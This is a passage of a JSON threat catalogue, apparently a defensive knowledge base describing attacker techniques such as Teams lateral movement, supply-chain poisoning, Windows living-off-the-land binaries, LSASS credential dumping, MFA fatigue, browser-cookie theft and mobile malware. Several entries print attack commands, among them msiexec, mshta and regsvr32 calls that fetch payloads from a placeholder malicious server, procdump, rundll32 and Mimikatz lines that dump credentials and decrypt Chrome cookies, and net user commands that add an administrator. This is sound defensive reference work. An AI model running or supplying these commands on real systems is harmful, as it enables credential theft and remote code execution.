                "description": "Lateral movement refers to attackers exploiting compromised accounts or systems \nto navigate through a network and gain access to sensitive resources. In the context \nof Microsoft Teams, attackers leverage its collaboration features and integrations \nto move laterally within an organization environment. Here are the main techniques \nand risks associated with this threat:    \n\n### How Attackers Exploit Teams for Lateral Movement\n1. **Compromised Accounts**    - Attackers gain access to low-privileged Teams accounts through phishing or   credential theft. These accounts are then used to impersonate trusted users and   escalate privileges.  - Sensitive credentials stored on shared systems can be exploited for lateral moves.    \n\n2. **File Sharing Abuse**    - Malicious files (e.g., malware-laden executables or scripts) are distributed   through Teams chats or channels, targeting internal users.    - These files can auto-execute or trick users into running them, enabling attackers   to infect other systems.    \n\n3. **Federated Trust Exploitation**    - Misconfigured external access settings allow attackers from federated tenants   to infiltrate and move laterally between organizations.    \n\n4. **Remote Execution Tools**    - Attackers use Teams-integrated tools like Quick Assist or remote desktop protocols   (RDP) to execute commands on other systems, furthering their movement.    \n\n5. **Credential Theft Techniques**    - Methods like Pass-the-Hash (PtH) or Pass-the-Ticket (PtT) are used to steal   authentication data from compromised systems, enabling attackers to impersonate   users across the network.    \n\n### Risks of Lateral Movement via Teams\n- **Domain Compromise**: Attackers can move towards domain controllers by exploiting \nstored credentials or misconfigurations.\n- **Sensitive Data Access**: Lateral movement enables access to high-value assets \nsuch as financial records, intellectual property, or administrative accounts.\n- **Stealthy Operations**: Native tools and legitimate credentials make detection \nharder, as malicious actions appear normal in audit logs.    \n"
            },
            "b6887f4b-eeae-462c-a2ac-7454efb5eabc": {
                "name": "Legitimate software dependency injected with malicious code",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Legitimate software dependency injected with malicious code refers\nto a type of attack where an adversary compromises a legitimate software\ndependency, such as a library or framework, by injecting malicious code\ninto it.  \n\nThe compromise of a legitimate package may occur when an attacker\nmanipulates trusted open-source components by injecting malicious payload.\nThis is achieved through variety of methods, for example, hijacking the\ncredentials of project maintainers or exploiting weaknesses in distribution\nplatforms. Since organizations and developers rely heavily on open-source\nsoftware, a compromised package can lead to malicious code being executed\non end-user systems or within the software development pipeline itself\nref [1].    \n\n### Examples for use cases\n\n- An adversary compromises a popular open-source library by injecting\nmalicious code into it. Examples for open-source libraries could be: NPM\npackages, JavaScript frameworks - React, Angular, Vue.js, PyPI packages, \nPython frameworks, Java libraries, Git repositories and others ref [2].\nWhen a developer uses this library in their software, the malicious code\nis executed, allowing the adversary to gain unauthorized access.  \n- A software vendor's build-in process is compromised, allowing an\nadversary to inject malicious code into the software's dependencies.\nWhen the software is installed and run, the malicious code is executed,\ncompromising the user's system.    \n### Possible malicious software infection methods\nFor more information review ref [3]\n- Typosquatting - The threat actor uses subtle typographical errors in\nthe malicious package name to resemble a popular package, often going\nunnoticed by the victim. These packages are usually registered in\nrepositories such as NPM and PyPI. As prevention of this attack method,\nsome developers register names that resemble the legitimate site,\nprecluding the typosquatter's opportunities.\n- Masquerading - This attack method completely duplicates the code and\nthe metadata of a known package, and a snippet of malicious code is added,\nthereby creating a Trojan package. Unlike the typosquatting method, this\nmethod uses the exact name of a legitimate package to deceive developers\nthrough similarity.\n- Dependency confusion - Dependency is a piece of software required for\na particular program to function. Software dependencies can be either\ninternal or external. In this technique, the threat actor employs a\nvalid name of an internal package for the malicious package and publishes\nthe malicious package on a public repository with a higher version number.\nSince default package managers tend to prioritize higher version numbers,\nthis practice increases the vulnerability to malicious package attacks.\n- Dependency hijacking - In this method, the threat actor compromises\na legitimate package and pushes malicious code into it. This is done by\ntaking over maintainers' or developers' accounts or injecting obfuscated\nmalicious code into a legitimate open-source project.  \n"
            },
            "426a0ab5-66e7-4149-82b0-6357a1cf4b4b": {
                "name": "Leverage Windows Utilities for Proxy Execution of Malicious Code",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors frequently exploit legitimate Windows utilities to execute malicious \ncode covertly, a technique known as \"Living off the Land\" (LotL). \nBy using trusted system binaries, attackers can bypass security measures that focus \non untrusted or unusual processes, thereby reducing the likelihood of detection.\n\n### 1. Ieexec.exe\n\n**Description**: A utility that executes .NET programs. Threat actors can use ieexec.exe \nto run malicious executables under the guise of Internet Explorer components.\n\nExample:\n\n```\nieexec.exe C:\\path\\to\\malicious.exe\n```\n\n### 2. Ie4uinit.exe\n\n**Description**: Initializes user-specific settings for Internet Explorer. \nCan be misused to execute INF files.\n\nExample:\n\n```\nie4uinit.exe -UserIconConfig\n```\n\n### 3. Msiexec.exe\n\n**Description**: Used for installing, modifying, and performing operations \non Windows Installer packages. Threat actors can execute malicious MSI packages or scripts.\n\nExample:\n\n```\nmsiexec.exe /q /i http://malicious-server/payload.msi\n```\n\n### 4. Pcwrun.exe\n\n**Description**: Part of the Performance Counters for Windows. \nIt can be exploited to run scripts or executables under certain conditions.\n\nExample:\n\n```\nPcwrun.exe /../../$(calc).exe\n```\n\n### 5. DevToolsLauncher.exe\n\n**Description**: Associated with Visual Studio development tools. \nIt can be abused to execute code or scripts in the context of development environments.\n\nExample:\n\n> Execute any binary with given arguments and it will call developertoolssvc.exe. \ndevelopertoolssvc is actually executing the binary.\n\n```\ndevtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] \"argument here\" test\n```\n\n### 6. Iediagcmd.exe\n\n**Description**: Diagnostics Utility for Internet Explorer\nIt can be used to execute binary pre-planted.\n\nExample:\n\nA .url file is sent to the victim or planted on disk.\nIt sets the WorkingDirectory to \\\\attacker.webdav.server\\share\niediagcmd.exe tries to launch other tools like route.exe, \nnetsh.exe, or CustomShellHost.exe.\n\n```\n[InternetShortcut]\nURL=C:\\\\Program Files\\\\Internet Explorer\\\\iediagcmd.exe\nWorkingDirectory=\\\\\\\\192.168.8.200@80\\\\payload\nIconFile=C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\nIconIndex=13\nShowCommand=7\n```"
            },
            "dcccd7e5-9d3f-4b36-853a-5cd18a7ef752": {
                "name": "Linux kernel module injection from container",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Loadable Kernel Modules (LKM) can be used by adversaries to deliver \nsophisticated and hard to detect rootkits. Each event where kernel modules \nare loaded from a container should be investigated with the exeption of \nSecurity tools deployed in containers.\n\nAn injected kernel module is just code execution, and can in theory do \nmore or less anything, but threat actors mostly use this for dwelling and \nfor hiding their presence on a system.\n"
            },
            "0834302b-90d3-45ec-95d1-3e41ec14f7c6": {
                "name": "Listing passwords stored in registry",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Listing passwords stored in the Windows Registry is a technique employed by adversaries \nto extract sensitive credentials from compromised systems. The Windows Registry is a \ncentralized database that stores configuration settings and options for the operating \nsystem and installed applications. Some applications, due to misconfigurations or poor \nsecurity practices, store user credentials in the registry, sometimes in plaintext \nor in an easily reversible format.  \n\nThreat actors may use the built-in Windows command-line utility reg.exe to query registry \nkeys that potentially contain stored credentials.  \n\n```bat\nreg query HKLM /f password /t REG_SZ /s\n```\nThis command is scanning registry hives for the value password.  \n\nPowerShell provides a powerful scripting environment that can recursively search the \nregistry for keys containing specific terms like \"password.\"  \n\n```powershell\nGet-ChildItem -Path Registry:: -Recurse -ErrorAction SilentlyContinue |\nGet-ItemProperty |\nWhere-Object { $_.PSObject.Properties.Name -match \"Password\" -and $_.Password }\n```\nThis script searches all registry keys for properties named \"Password\" and lists them if found.  \n\nSome applications store credentials in specific registry locations. For example, \nVPN clients or database tools might store user credentials under their software keys in HKCU or HKLM hives.\n"
            },
            "3088db32-843b-439f-9374-f8c04a82b2ec": {
                "name": "LNK files downloaded on a workstation",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A malicious .lnk file can be crafted to execute arbitrary code, download\nmalware, or exploit vulnerabilities in the operating system. The threat\nactors can use social engineering tactics to trick users into downloading\nand opening these files, which can lead to some of the following threats\nref [1], [2]:\n\n- Malware infection: The .lnk file can download and install malware,\nsuch as viruses, Trojans, or ransomware, onto the workstation.\n- Code execution: The file can execute malicious code, potentially\nallowing attackers to gain control of the workstation or steal sensitive\ndata.\n- Exploitation of vulnerabilities: Malicious .lnk files can exploit known\nvulnerabilities in the operating system or applications, leading to further\ncompromise.\n\nIn one of the observed and reported threat actor cyber-espionage campaigns\na North Korean threat actor spreads spear-phishing e-mails containing a link\nto a password-protected document which contains LNK file.  \n\nThe lure contains a e-mail with a title \"Political Advisory Meeting to\nbe held at the EU Delegation on May 14.\" This was both the e-mail subject\nand the name of a zip file sent through a Dropbox link. The mail contains\na password-protected zip file with included .lnk file in it. Once an end-\nusr click this file, it will download a payload usually from a GitHub \nrepository. Further the payload executes and infect the host.   \n"
            },
            "e2d8ce6b-f21e-4444-a828-0c6b722a9c93": {
                "name": "Local user account added",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors may add or modify local user accounts on compromised systems to \nestablish persistence, maintain unauthorized access, and potentially \nescalate privileges. By leveraging administrative permissions\u2014often obtained \nthrough credential theft, exploitation of vulnerabilities, or lateral movement\u2014\nadversaries create new user accounts that allow them to re-enter the system \nat will, even if initial malware implants or other backdoor mechanisms \nare detected and removed.  \n\n## Windows\n\nAdversaries might run commands like :\n```bash\nnet user /add [username] [password] \nor \nnet localgroup administrators [username] /add\n```\n\nTo stealthily provision accounts with elevated permissions. \n\n## Linux or macOS\n\nThreat actors may modify :\n```bash\n/etc/passwd\nor \n/etc/shadow\n``` \nor use commands like `useradd` or `dscl` to create new users.\nThe changes perfomed by using the above commands can be detected by \nmonitoring certain paths, such as `/usr/sbin/useradd`.  \nIn some cases, attackers may script these actions to occur automatically during \ntheir post-exploitation phase, making detection more challenging.  \n\nIn practice, once these local accounts are established, the attackers can \nmaintain a foothold within the environment, pivot to other hosts, \nexfiltrate data, or stage further attacks. The long-term impact of such \naccount additions may lead to data breaches, reputation damage, financial \nloss and regulatory consequences.  \n"
            },
            "d5892ae6-d022-4ac8-858c-c2756067cdac": {
                "name": "Malicious Code Execution with Windows Utilities",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "### 1. Msxsl.exe\n\n**Description**: A command-line XSLT processor that can transform XML data using \nXSL style sheets. Attackers can craft malicious XSL files that execute arbitrary \ncode when processed.\n\nExample:\n\n```\nmsxsl.exe input.xml malicious.xsl\n```\n\n### 2. Mshta.exe\n**Description**: Executes Microsoft HTML Applications (HTA files). Threat actors use it \nto run malicious scripts hosted locally or remotely.\n\nExample:\n\n```\nmshta.exe \"http://malicious-server/payload.hta\"\n```\n\n### 3. Regsvr32.exe\n**Description**: Registers and unregisters OLE controls like DLLs and ActiveX controls. \nThreat actors can use it to execute code via scripts.\n\nExample:\n\n```\nregsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll\n```"
            },
            "8934c19a-954b-4dce-8081-0a6acca599f6": {
                "name": "Malicious container image deployed",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors plant malicious code into container images which \nexecute in target environment. This vector is used to perform \ncryptominning activities and as a persistence technique.\n"
            },
            "83343a35-daa0-41a2-ae09-6876b3ef9c11": {
                "name": "Malicious kernel module",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may attempt to modify Linux kernel parameters or load/unload kernel \nmodules to alter system behavior, hide malicious activities, or install rootkits. \nBy operating at the kernel level, attackers can gain persistent and stealthy \ncontrol over a system, intercepting system calls, hiding processes, files, \nor network connections.  \n\nFor example, an attacker with root access might execute insmod malicious_module.ko \nto load a malicious kernel module that conceals their presence and activities. \nKernel rootkits like Adore-ng or Suterusu are examples of tools used for such purposes. \nThese rootkits can hide network connections, processes, and files, effectively \nmasking the adversary's footprint on the system.\n"
            },
            "b8740296-9d34-453b-8127-b5d8659a6138": {
                "name": "Malicious profile installed on mobile device",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A \"malicious profile\" refers to a configuration file installed on a mobile device \nthat compromises its security and privacy. These profiles exploit the device's settings \nto grant attackers unauthorized control or access to sensitive data, making them \na serious threat vector for mobile devices.\n\n### How Malicious Profiles Are Installed\n\nAttackers use various techniques to deploy malicious profiles on devices:\n\n1. **Phishing Attacks**: Victims are tricked into clicking links or downloading \nfiles via phishing emails or websites. These links often promise to fix security \nissues or provide valuable services, convincing users to install the malicious profile.\n\n2. **Social Engineering**: Attackers manipulate users into believing the profile \nis legitimate, often using fake security alerts or enticing offers.\n\n3. **Man-in-the-Middle (MitM) Attacks**: Over unsecured Wi-Fi networks, attackers \nintercept communications and install malicious profiles by redirecting traffic through \nspoofed hotspots.\n\n4. **Third-Party App Stores**: Android users may unknowingly install malicious apps \ncontaining configuration profiles from unverified sources.\n\n### Implications of Malicious Profiles\n\nMalicious profiles can severely compromise a device's security, privacy, and functionality:\n\n1. **Persistent Control**: Once installed, these profiles often cannot be removed \nmanually, allowing attackers long-term control over the device settings.\n\n2. **Data Interception**:  - Profiles may configure devices to route traffic through malicious VPNs or proxy   servers, enabling attackers to intercept and decrypt sensitive information such   as emails, banking credentials, and social media passwords.  - Installation of untrusted root certificates allows attackers to bypass TLS/SSL   encryption and impersonate secure websites.\n\n3. **Surveillance Capabilities**:  - Attackers can record conversations, monitor messages, and even capture audio   from the environment using malicious profiles.  - Corporate devices are particularly vulnerable as attackers may redirect email   traffic or manipulate enterprise configurations.\n\n4. **Device Misconfiguration**:  - Malicious profiles can alter Wi-Fi settings, enforce insecure passcodes, or   disable security apps, weakening the device\u2019s overall security posture.\n\n5. **Persistence for Future Attacks**:  - By tampering with trust settings (e.g., certificates), attackers ensure that   the device implicitly trusts them for future actions without user intervention.\n\n### Examples of Exploits\n\n- **iOS Devices**:  Attackers exploit configuration vulnerabilities by installing untrusted profiles   that intercept secure connections and manipulate user sessions. For example, phishing   campaigns may trick users into downloading profiles that hijack email traffic   or steal credentials.\n\n- **Android Devices**:  Malware such as \"Godless\" exploits older Android versions by embedding malicious   configuration files within apps downloaded from third-party stores. These files   gain root access and install spyware for complete device takeover.\n"
            },
            "78683822-44dc-41ac-8fef-b5f0968743c9": {
                "name": "Malicious Software Dependencies Faking Known Packages",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Adversaries maymimick known and trusted software packages and\ndistributors, with the intent to be mistaken for the original developer,\nand thus deliver malicious code that will be embedded in the\nvictim's applications. They may use sophisticated automation\nto appear convincing and fool the target. Once delivered, the package may\ncontain any payload, from crypto mining, to credential theft, command and control etc."
            },
            "2d0beed6-6520-4114-be1f-24067628e93c": {
                "name": "Manipulation of credentials stored in LSASS",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Credentials can be stored in the Local Security Authority Subsystem\nService (LSASS) process in memory for use by the account. LSASS stores\ncredentials in memory on behalf of users with active Windows sessions.\nLSASS can store user or system credentials in several different ways: \nReversibly encrypted plaintext, Kerberos Tickets, NT hashes or LM\nhashes. \n\nThe threat actors can harvest these credentials with an administrative\nuser or SYSTEM. Administrative accounts are used by users to carry out\ntasks that require special permissions, such as installing software or\nrenaming a computer and they need higher administrative privileges. In\nthe most cases the threat actors are using different tools to manipulate\nthe credentials in LSASS process in memory, for example: Mimikatz, Cobalt\nStrike, Impacket, Metasploit, PowerSploit, Empire, Pwdump, Dumpert and\nothers.\n\nMimikatz is a tool that allows an attacker to extract clear text passwords,\nhash values, and Kerberos tickets from LSASS. The tool can be used to\nretrieve password information for a user account that is currently logged\ninto a system, or to extract the hashes of all user accounts on a system,\nwhich can then be used to perform offline password cracking.\n\nBy manipulating LSASS, an attacker can gain access to sensitive information,\nsuch as passwords and other credentials, and use that information to\ncompromise the security of a system or network.\n\nFor example, on thetarget host threat actors can use procdump:\n\nprocdump -ma lsass.exe lsass_dump\n\nExample for a local credential dumping from LSASS memory with Mimikatz\nsekurlsa:\n\nsekurlsa::Minidump lsassdump.dmp\nsekurlsa::logonPasswords\n\nExample for process dumping memory of lsass.exe to obtain credentials.\nThreat actors are using dynamic-link libraries (DLLs) like Rundll32 to\nmanipulate the process in LSASS memory.\n\nrundll32 C:\\windows\\system32\\comsvcs.dll MiniDump lsass.dmp\n\nOR\n\nprocess == rundll32.exe\n&&\ncommand_line_includes ('MiniDump')\n\nExample for a process that access LSASS memory:\n\nprocess == ('powershell.exe' || 'taskmgr.exe' || 'rundll32.exe' || 'procdump.exe' \n|| 'procexp.exe' || [other native processes that don\u2019t normally access LSASS]) &&\ncross_process_handle_to ('lsass.exe')\n\nThreat actors can use PowerShell scripts to request process access to\nlsass.exe process (an example for access to PROCESS_ALL_ACCESS \u2013 0x1F0FFF\nprocess):\n\n$Handle = [Uri].Assembly.GetType('Microsoft.Win32.NativeMethods')::OpenProcess(0x1F0FFF, $False, (Get-Process lsass).Id)\n\nIf the key value pair in the registry for LSASS is changed to 1, this\nis an indicator that the passwords are stored in cleartext in LSASS memory.\n\nExample for a DWORD in the registry: \n\nHKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/SecurityProviders/WDigest/UseLogonCredentia\n"
            },
            "82dce94c-7b18-4cb9-bae0-56716b580418": {
                "name": "Manipulation of credentials stored in plain text files",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors are searching for credentials stored in plain text, usually in\nan application's properties, configuration files, system memory or other\nplaces in the system. Storing a plain text password could lead to data\nleakage because, for example when the passwords are stored in clear text\nin a configuration file everyone who has read access to the file can see\nand steal the passwords. In most cases, even storage of a plaintext\npassword in a memory is considered as a security risk if the password\nis not cleared immediately after it is used. Good password management\npolicies require that a password shouldn't be stored in a plaintext.\n\nIn some cases the user's passwords are stored in plain text when a program\napplication or system file crates and saves them automatically in a file\nwithout encryption. In other cases the credentials can be stored in clear \ntext by user's mistake. Threat actors are using different methods like:\npassword cracking, dictionary attack, social engineering and phishing\nattacks, man in the middle attack, malware injections and others to steal\nand manipulate credentials stored in a plain text.\n\nOne example of manipulation of credentials stored in plain text files is by\nusing a technique called \"password cracking.\" This involves using a computer\nprogram to repeatedly guess a password or its hash until the correct one is\nfound. If the plain text file containing the credentials is not properly\nsecured, an attacker could gain access to sensitive information such as\nusername and password combinations. Threat actors are using variety of\ndifferent tools to crack user's credentials, for example: John the Ripper,\nHashcat, Aircrack-ng, Cain and Abel, Mimikatz, custom python scripts and\nothers. \n\nExample for a code that reads a password from a properties file and uses\nthe password to connect to a database:\n\nProperties prop = new Properties();\nprop.load(new FileInputStream(\"config.properties\"));\nString password = prop.getProperty(\"password\");\n\nDriverManager.getConnection(url, usr, password);\n\nExample for a python script scanning for files stored in a clear text:\n\n# put your path here \n# Network SMB path you want to search \nroot_dir = (\"xxxxxx\", \"etc.\")\n# location where you want to put the result \nstored_dir = 'xxxxxxxxx'\n# exception you want to filter\nexception_path = [\"snapshot\"]\n"
            },
            "4a807ac4-f764-41b1-ae6f-94239041d349": {
                "name": "MFA Bypass Techniques",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "MFA is a technique that requires more than one piece of evidence to authorize the user to \naccess a resource. If two pieces of evidence are needed to verify, this approach is called 2FA.\nThe difference between 2FA and MFA is that 2FA requires only two factors; on the other hand,\nMFA can add more layers until the login attempts do not seem suspicious anymore.\n\nA MFA bypass is a broad term referring to an attack method where a cybercriminal \nnavigates around MFA requirements to gain unauthorized access to an account.\n"
            },
            "56500aed-5dec-42a8-a275-f1392abac979": {
                "name": "MFA fatigue",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "MFA fatigue (aka MFA abuse, MFA bombing or MFA spamming) is a popular technique\ndue to its low complexity and high success rate.\n\nIt is a social engineering attack strategy where attackers repeatedly push\nsecond-factor authentication requests to the target user email, phone, or registered\ndevices. The goal is to spam users to the point where they are annoyed by the constant \nnotifications and approve one so it will stop. By doing so, the attacker has effectively \nbypassed MFA by tricking the user into approving the login attempt.\n\nThe fact that the attacker can trigger MFA push notifications means they obtained\nthe credentials of the user. This attack is often preceded by other social engineering\nattack vectors, such as phishing, to gain credentials. Stolen credentials may also\nbe acquired from the dark web or via many other attack vectors.\n\nAttacker may trigger push notifications throughout the day with the hopes that\none of the attempts will coincide with the user login activity, so the user will\napprove it without suspicion.\n\nMFA fatigue attack chain unfolds as follows:\n\n1. User credentials and information are collected.\nThe attack begins with user information already available. The attacker will typically\nhave access to a victim username, password, or recovery credentials. This might be\nsourced from preliminary attacks (such as phishing or social engineering) or may have\nbeen exposed credentials from a larger breach.\n\n2. Stolen credentials are used to send MFA push notifications.\nThe attackers then use the gained credentials to sign-in to a target account or device\nsecured by push multi-factor authentication. Typically, the attacker will attempt\nto activate the authenticating application push notifications in quick succession.\nThese push notifications can happen over email, text message, or desktop notification,\nbut are generally pushed to the user authenticated mobile device.\n\n3. User gets push notifications and becomes fatigued.\nThe user will now rapidly receive push notifications as the attacker attempts to\noverwhelm them. The attacker goal is for the victim to push \u201cyes\u201d and confirm their\nidentity, allowing the attacker to go further into their account or device.\nOften, the user may think it is a simple application malfunction or a test,\nor just want the notifications to end out of annoyance.\n"
            },
            "630f420b-b844-42f1-8be1-d367b3734024": {
                "name": "Mimikatz browser cookie extraction",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "We describe how an attacker could extract cookies using the example of the Chrome browser.\n\nChrome stores cookies in the following location in a SQLite database:\n%localappdata%GoogleChromeUser DataDefaultCookies\n\nThe cookies for a given user are encrypted using keys tied to that user via the\nMicrosoft Data Protection API (DPAPI). To access the cookie database and decrypt \nthe cookies, an adversary can use the following mimikatz command:\n\ndpapi::chrome /in:\"%localappdata%GoogleChromeUser DataDefaultCookies\" /unprotect\n\nAlternatively, adversaries could execute the following from the command line:\nmimikatz.exe privilege::debug log \"dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect\" exit\n\nUsing either of these options will provide the browser cookies.\n\n\n## PtC attack scenario\n\n1. A sysadmin uses regularly the Azure management portal, MFA is enabled with the authenticator   app on his mobile device.       He has clicked on a phishing email or his system has been compromised by some other means,   and now an attacker is able to execute code within the user context.\n\n2. Execute Mimikatz when running as the user   mimikatz.exe privilege::debug log \"dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect\" exit       Attackers look for the Azure authentication cookies, including ESTSAUTH, ESTSAUTHPERSISTENT and ESTSAUTHLIGHT.    \n3. To pass the cookies into another session to take over the user account, opening Chrome on another server   and use the \u201cInspect\u201d interface to insert a cookie.        Add the ESTSAUTH or If ESTSAUTHPERSISTENT cookie. If ESTSAUTHPERSISTENT is available, it is preferred because    it is generated by the \u201cStay Signed In\u201d option.     \n\n4. Refresh the page and now attackers are logged into Azure as the user \u2014 no MFA required.\n"
            },
            "7351e2ca-e198-427c-9cfa-202df36f6e2a": {
                "name": "Mimikatz execution on compromised endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "Emergency",
                "description": "Mimikatz is a very versatile tool that comes with a lot of \noptions and capabilities. Detection of known Atomic IOCs of \nthe mimikatz tool itself or the atomic IOCs of invoke-mimikatz \npowershell scripts, is very important, as it both signals a \ncompromised endpoint, plus shows a noisy threat actor trying \nto EoP and move laterally. \n"
            },
            "99c78650-8e19-4756-90fb-2573242577ca": {
                "name": "Mobile device compromised by spyware app",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Earlier versions of spyware apps were installed on smartphones through vulnerabilities\nin commonly used apps, or involving an SMS or iMessage that provides a link to a website. \nIf clicked, this link delivers malicious software that compromises the device.\nIt can also be installed over a wireless transceiver located near a target,\nor manually if attacker can steal the phone that has been targeted.  \n\nSince 2019, attackers have been able to install spyware on smartphones with a missed call on WhatsApp,\nincluding delete the record of the missed call, making it impossible for the owner to know anything is amiss.\nAnother way is by simply sending a message to a phone that produces no notification.  \n\nIn the latest versions of spyware does not require the user to do anything. All that is required for a\nsuccessful spyware attack and installation is having a particular vulnerable app or OS installed on the device,\nsuch as vulnerabilities in the iMessage service in iPhones which allows for infection by simply receiving a message.\nThis is known as a zero-click exploit.     \n\nOnce installed, spyware malware can theoretically harvest any data from the device and transmit\nit back to the attacker. It can steal photos and videos, recordings, location records, communications,\nweb searches, passwords, call logs and social media posts.\nIt also has the capability to activate cameras and microphones for real-time surveillance\nwithout the permission or knowledge of the user.  \n"
            },
            "ef4ba2bf-dfcb-4b70-8f45-7625baeb96d0": {
                "name": "Mobile malware attacks targeting iOS",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "iOS devices are protected by a robust, layered security architecture,\nyet attackers continue to develop sophisticated malware that targets \nApple devices. These threats exploit OS' vulnerabilities, abuse of\nlegitimate features, and use of social engineering to gain unauthorized \naccess, steal sensitive data, or remotely control devices.\n\n### How malware interacts with the architecture\n\nDespite these protections, attackers exploit weaknesses at different\nlayers of the iOS architecture:\n\n- **Jailbreaking:** By exploiting kernel or system vulnerabilities, attackers\ncan break out of the sandbox and disable code signing, allowing arbitrary code\nexecution and installation of malicious apps. This undermines the foundational\nsecurity of the Core OS layer.\n\n- **Enterprise Provisioning/MDM Abuse:** Attackers use enterprise certificates\nor MDM profiles to bypass App Store restrictions and install malicious apps,\ncircumventing code signing checks at the app distribution level.\n\n- **App Replacement (Masque Attack):** Exploits flaws in the app installation\nprocess, allowing a malicious app to replace a legitimate one if it shares the\nsame bundle identifier, gaining access to sensitive app data.\n\n- **Vulnerability Exploitation:** Attackers target flaws in system frameworks or \nthe kernel to escalate privileges, bypass sandboxing, or execute unauthorized code.\n\n- **Reverse Engineering and Code Injection:** Attackers decompile apps to discover \nsensitive logic or keys, inject malicious code, or bypass security controls. Lack \nof obfuscation and anti-tamper mechanisms make these attacks easier.\n\n- **Dynamic Instrumentation:** Tools like Frida or Ghidra allow real-time\nmanipulation of app processes, bypassing authentication or extracting sensitive data.\n\n- **Man-in-the-Middle (MitM) Attacks:** Target insecure network communications, \nintercepting data between the app and backend servers.\n\n### Abuse of iOS architecture\n\nThe basic architecture for iOS is divided into four **layers**: - Core services, Core OS: manage basic services in iOS   - Cocoa Touch, Media: handle the user interface and advanced graphics.\n\nBelow the layers there are the iOS **frameworks**, which are similar to static and\ndynamic shared libraries, they provide a library of routines that an application can\naccess to do a specific task: - Security   - UIKit   - Foundation   - AVFoundation   - System Configuration   - MessageUI\n\nAfter the frameworks there are the functions, which are being abused by different malware.\n\n### Attack Vectors\n\n- **Exploitation of Vulnerabilities:** Attackers leverage flaws in iOS, such as \nremote code execution or privilege escalation, to run malicious code on devices \nwithout user interaction.\n\n- **Malicious Messaging:** Some attacks use iMessage or other messaging platforms \nto deliver exploit-laden attachments, triggering vulnerabilities and enabling further \ncompromise.\n\n- **Abuse of Enterprise Provisioning:** Attackers misuse Apple\u2019s Developer Enterprise \nProgram to distribute malicious apps outside the App Store, bypassing Apple\u2019s app \nreview process.\n\n- **Masque Attack:** Replaces a legitimate app with a malicious one sharing the \nsame bundle identifier, allowing credential theft or background surveillance.\n\n- **Social Engineering and Phishing:** Users are lured into installing malicious \nprofiles or apps via deceptive messages, websites, or emails.\n\n### Types of iOS Malware (excluding Spyware) and Functions\n\n| Malware Type                  | Functionality                                                                                 | Example(s)                        |\n|-------------------------------|---------------------------------------------------------------------------------------------|------------------------------------|\n| **Remote Access Trojan (RAT)**| Grants attackers remote control over the device, can install apps, manipulate settings, etc. | GoldPickaxe                        |\n| **Adware**                    | Displays intrusive ads, redirects traffic, generates ad revenue for attackers                | Lock Saver Free, Muda (AdLord), YiSpecter |\n| **Ransomware/Scareware**      | Locks device/browser or displays fake warnings, demands payment to restore access            | Safari JavaScript Pop-up Scareware |\n| **Credential Stealers**       | Steals Apple ID, passwords, or banking credentials                                          | KeyRaider, XcodeGhost              |\n| **App Replacement/Impersonation** | Replaces legitimate apps with malicious ones to steal data or perform fraudulent actions    | Masque Attack, YiSpecter           |\n\n### Impact and Risks\n\n- **Data Theft:** Attackers can steal personal information, financial data, and \nsensitive communications.\n\n- **Device Takeover:** Some malware enables full remote control of the device, allowing \nattackers to impersonate the user or perform fraudulent transactions.\n\n- **Corporate Espionage:** In enterprise environments, a compromised iOS device \ncan serve as an entry point into corporate networks, leading to broader breaches \nand operational disruptions.\n\n- **Extortion:** Attackers may use scareware or ransomware to extort victims for \npayment in exchange for restoring access or not disclosing stolen data.\n\n- **Disruption:** Adware and scareware can degrade device performance, flood users \nwith ads, or lock browsers, impacting usability.\n"
            },
            "48432b70-77c4-4f5a-9d66-75764c1777c6": {
                "name": "Modify Microsoft Sentinel Data Connector to impair Detections",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "A threat actor may want to disable, remove or update the configuration of\nSentinel Connectors to act invisibly in Azure, which would impair the ability\nof a SOC to receive alerts since it would stop log file ingestion into Azure\nSentinel. \n\nAn attacker can do this either by deploying via API an ARM template, biceps\ntemplate, or other script/code element that can be used via Azure APIs,\nusing the Azure CLI or directly on the portal itself via a browser.\n"
            },
            "4110c951-3120-49fb-b54b-3d3aa896296b": {
                "name": "MoonTag backdoor",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
